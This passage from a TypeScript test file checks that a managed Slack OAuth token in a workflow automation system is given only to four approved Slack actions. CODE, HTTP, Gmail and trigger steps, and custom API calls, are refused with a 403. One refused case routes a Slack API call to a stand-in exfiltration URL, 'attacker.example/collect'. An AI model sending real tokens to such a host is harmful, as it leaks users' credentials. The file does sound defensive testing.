      expect(await response.json()).toMatchObject({ type: "OAUTH2", pieceName: MAILCHIMP, value: { access_token: MAILCHIMP_TOKEN, server_prefix: "us1", jarvis_managed: "mailchimp" } });
    }
  });
});

describe("managed Slack is scoped to Slack steps", () => {
  const SLACK_TOKEN = "synthetic-managed-slack-bot-token";
  const ref = "{{connections.jarvis:slack}}";
  let dataDir: string;
  beforeEach(() => {
    dataDir = mkdtempSync(join(tmpdir(), "slack-scope-"));
    mkdirSync(join(dataDir, "connections"));
    writeFileSync(join(dataDir, "connections", "slack.json"), JSON.stringify({ version: 1, provider: "slack", status: "connected",
      generation: crypto.randomUUID(), access_token: SLACK_TOKEN, account: { id: "U123", label: "Jarvis bot" },
      workspaces: [{ id: "T123", name: "Sandbox" }], settings: { scopes: "channels:read,chat:write,groups:read" },
      connected_at: new Date().toISOString() }));
    credentials.register(new JarvisSlackConnectionSource(dataDir));
  });
  afterEach(() => rmSync(dataDir, { recursive: true, force: true }));
  const post = (input: Record<string, unknown> = { auth: ref }, nextAction?: any): any => ({
    name: "post", type: "PIECE", settings: { pieceName: SLACK, actionName: "slack_post_message", input }, ...(nextAction ? { nextAction } : {}),
  });
  const slackTrigger = (extra: Record<string, unknown> = {}): any => ({ name: "trigger", type: "PIECE_TRIGGER",
    settings: { pieceName: SLACK, triggerName: "new_message", input: { auth: ref }, ...extra } });
  const slackCall = (url: string): any => ({ name: "call", type: "PIECE",
    settings: { pieceName: SLACK, actionName: "custom_api_call", input: { auth: ref, method: "GET", url: { url } } } });
  const refused: Array<[string, any]> = [
    ["a CODE step input", empty(code({ conn: ref }))],
    ["an HTTP step header", empty(http({ Authorization: "Bearer " + ref }))],
    ["a Gmail step auth", empty(gmail({ auth: ref }))],
    ["a Slack step next to a CODE step that reads the token", empty(post(undefined, code({ token: "{{connections['jarvis:slack'].access_token}}" })))],
    ["a Slack custom API call to another host", empty(slackCall("https://attacker.example/collect"))],
    // Defense in depth: only the four managed Slack actions get the token, even on Slack's own API host.
    ["a Slack custom API call to a path under its API", empty(slackCall("/auth.test"))],
    ["a Slack custom API call on slack.com", empty(slackCall("https://slack.com/api/auth.test"))],
    ["a Slack action outside the managed actions", empty({ name: "send", type: "PIECE", settings: { pieceName: SLACK, actionName: "send_message", input: { auth: ref } } })],
    ["a Slack trigger", slackTrigger()],
    ["a Slack trigger that also carries a managed actionName", slackTrigger({ actionName: "slack_post_message" })],
  ];
  for (const [label, trigger] of refused) {
    test(`${label} is not ready and the route refuses it`, async () => {
      expect(bindingIssues(trigger).length).toBeGreaterThan(0);
      const response = await fetchFor(runOf(trigger), "jarvis:slack");
      expect(response.status).toBe(403);
      expect(await response.text()).not.toContain(SLACK_TOKEN);
    });
  }
  test("the refusal names Slack", () => {
    const [issue] = bindingIssues(empty(code({ conn: ref })));
    expect(issue!.message).toBe("Managed connection jarvis:slack can only be used by Slack steps");
    expect(issue!.allowedPieces).toEqual([SLACK]);
    const [call] = bindingIssues(empty(slackCall("https://slack.com/api/auth.test")));
    expect(call!.message).toBe("This Slack connection does not support this action or trigger yet");
  });
  test("a trigger hook of a Slack trigger is refused the token", async () => {
    for (const trigger of [slackTrigger(), slackTrigger({ actionName: "slack_post_message" })]) {
      const flow = createFlow({});
      const version = createDraftVersion({ flowId: flow.id, displayName: "Hook", trigger });
      const response = await fetchFor(triggerHookRunId("poll", flow.id, version), "jarvis:slack");
      expect(response.status).toBe(403);
      expect(await response.text()).not.toContain(SLACK_TOKEN);
    }
  });
  test("every managed Slack action's auth passes the connection scope and resolves", async () => {
    for (const actionName of ["slack_find_channel", "slack_get_channel_info", "slack_post_message", "send_channel_message"]) {
      const trigger = empty({ name: "step", type: "PIECE", settings: { pieceName: SLACK, actionName, input: { auth: ref } } });
      expect(bindingIssues(trigger)).toEqual([]);
      const response = await fetchFor(runOf(trigger), "jarvis:slack");
      expect(response.status).toBe(200);
      expect(await response.json()).toMatchObject({ type: "OAUTH2", pieceName: SLACK, value: { access_token: SLACK_TOKEN } });
    }
  });
});
